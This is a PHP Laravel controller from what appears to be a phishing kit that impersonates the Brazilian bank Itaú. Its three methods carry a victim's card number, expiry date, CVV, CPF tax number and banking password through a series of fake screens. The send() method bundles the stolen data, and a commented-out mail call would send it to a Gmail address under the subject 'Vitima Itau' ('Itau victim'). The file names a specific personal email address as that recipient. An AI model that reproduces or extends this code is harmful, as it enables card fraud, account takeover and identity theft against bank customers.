<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;

class itauenviarMail extends Controller
{
    public function enviarOne(Request $request){
    	$cc = $request->input('cc');
    	$val = $request->input('validade');
    	$cvv = $request->input('cvv');
		

 		return view('itau.tela2', 
            [
                'cc' => $cc,
                'val' => $val,
                'cvv' => $cvv,
            ]);
    }
		

    public function enviarTwo(Request $request){
    	$cc = $request->input('cc');
    	$val = $request->input('val');
    	$cvv = $request->input('cvv');

    	$cpf = $request->input('cpf');
    	$senha = $request->input('senha1');


		 
		 return view('itau.tela3', 
            [
            'cc' => $cc,
            'val' => $val,
            'cvv' => $cvv,
            'cpf' => $cpf,
            'senha' => $senha,
            ]);

    }


    public function send(Request $request){

    	$cc = $request->input('cc');
    	$val = $request->input('val');
    	$cvv = $request->input('cvv');

    	$cpf = $request->input('cpf');
    	$senha = $request->input('senha1');

        $data = array(
            'cc' => $cc,
            'val' => $val,
            'cvv' => $cvv,
            'cpf' => $cpf,
            'senha' => $senha
        );

    	// Mail::send('itau.email', $data, function ($message)
     //    {   
     //        $message->from('contact@tibiavines.com', 'Anonymous');

     //        $message->to('mariazelmadossantos@gmail.com')->subject('Vitima Itau');

     //    });

        return view('itau.tela3');

    }

    
}
